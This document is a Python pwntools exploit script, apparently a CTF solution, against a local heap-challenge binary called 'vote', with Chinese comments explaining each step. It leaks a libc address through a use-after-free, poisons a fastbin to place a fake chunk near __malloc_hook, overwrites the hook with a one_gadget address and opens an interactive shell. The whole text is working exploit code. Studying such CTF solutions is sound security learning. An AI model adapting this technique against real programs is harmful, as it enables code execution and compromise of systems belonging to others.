#coding:utf-8

from pwn import *

context.log_level = "debug"
context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.23.so")}
p = process("./vote", env=env)
# p = remote("localhost", 1234)

def action(number):
    p.recvuntil("Action: ")
    p.sendline(str(number))

def create(size, name):
    action(0)
    p.recvuntil("the name's size: ")
    p.sendline(str(size-16))
    p.recvuntil("the name: ")
    p.sendline(name)

def show(index):
    action(1)
    p.recvuntil("enter the index: ")
    p.sendline(str(index))

def vote(index):
    action(2)
    p.recvuntil("index: ");
    p.sendline(str(index))

def cancel(index):
    action(4)
    p.recvuntil("the index: ")
    p.sendline(str(index))

raw_input("let's go!")
raw_input("First, create 3 chunk")
create(128, '0')
create(128, '1')
create(128, '2')

cancel(1)
raw_input("show show show")
show(1)
p.recvuntil("count: ")
data = p.recvuntil("\n")
libc_leak = int(data.strip())
libc_base = libc_leak - 0x00007faf2abf0b78 + 0x00007faf2a82c000
malloc_hook_addr = libc_base + 0x7faf2abf0b10 - 0x00007faf2a82c000
log.info(malloc_hook_addr)
create(128, '3')


payload = p64(0) + p64(0x70) + p64(malloc_hook_addr-0x23)  # malloc_hook_addr-0x23+0x8 值是 p64(0x7f) 作为chunk_size
create(0x60, payload) # 4
create(0x60, '5')

cancel(4)
cancel(5)  # 现在 fastbin-->5-->4

for _ in range(0x20):
    vote(5)
# for循环之后 fastbin-->5-->fake_chunk-->malloc_hook-0x23    fake_chunk位于4中

# gdb.attach(p, "set follow-fork-mode parent")

create(0x60, '5')
create(0x60, '6')

one_gadget = libc_base + 0xf0274
payload = '\x00'*3 + p64(one_gadget)  # 修改malloc_hook
create(0x60, payload)

action(0)
p.recvuntil("the name's size: ")
p.sendline(str(0x60-16))

p.interactive()